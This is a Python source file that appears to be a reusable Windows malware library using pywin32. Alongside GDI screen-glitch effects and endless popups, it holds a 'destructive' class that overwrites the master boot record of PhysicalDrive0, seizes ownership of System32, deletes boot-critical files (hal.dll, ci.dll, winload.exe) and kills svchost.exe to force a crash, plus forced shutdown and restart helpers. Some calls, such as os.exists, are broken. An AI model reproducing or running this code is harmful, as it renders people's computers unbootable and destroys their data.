import time
from win32con import *
from win32ui import *
from win32gui import *
from win32api import *
from win32file import *
from random import *
import ctypes
import random
import os

class GDI:
    def tunnel():
        sw,sh = (GetSystemMetrics(0), GetSystemMetrics(1))
        HDC = GetDC(0)
        while True:
            StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)
            time.sleep(0.1)
    def screen_glitch(repeat_time, r, g, b):
        desk = GetDC(0)
        x,y = (GetSystemMetrics(0), GetSystemMetrics(1))
        for i in range(repeat_time):
            brush = CreateSolidBrush(RGB(
                r,
                g,
                b
            ))
            SelectObject(desk, brush)
            PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), PATINVERT)
            DeleteObject(brush)
            time.sleep(0.02)
        ReleaseDC(desk, GetDesktopWindow())
        DeleteDC(desk)
class Base:
    def warning(nameofmalware, command):
        answer = MessageBox(0, "This program called " + nameofmalware + " is considered malware. This malware will make your computer unusible. Would you still like to run this malware, destroying your PC?", nameofmalware, MB_YESNO | MB_ICONWARNING)
        if answer == IDYES:
            command()

class destructive():
    def DeleteMBR():
        hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
        WriteFile(hDevice, AllocateReadBuffer(512), None)
        CloseHandle(hDevice)
    def TakeownSystem32():
        os.system("cmd /c takeown /F /R C:\Windows\System32")
        os.system(f"icacls C:\Windows\System32 /grant %userprofile%:F")
    def DeleteCriticalFiles(repeat):
        hal_dll = "C:\Windows\System32\hal.dll"
        ci_dll = "C:\Windows\System32\ci.dll"
        winload_exe = "C:\Windows\System32\winload.exe"
        hal_exists = os.exists(hal_dll)
        ci_exists = os.exists(ci_dll)
        winload_exists = os.exists(winload_exe)
        for i in range(0, repeat):
            if hal_exists:
                os.remove(hal_dll)
            if ci_exists:
                os.remove(ci_dll)
            if winload_exists:
                os.remove(winload_exe)
            time.sleep(1)
    def BSOD():
        os.system("cmd /c wmic process where name=svchost.exe delete")
        os.system("cmd /c taskkill /f /im svchost.exe")

class annoying():
    def repeatingPopup(message, title):
        while True:
            MessageBox(0, message, title, MB_OK | MB_ICONWARNING)
    def shutdown(time, message):
        os.system("cmd /c shutdown /s /t " + time + " /c " + message)
    def restart(time, message):
        os.system("cmd /c shutdown /r /t " + time + " /c " + message)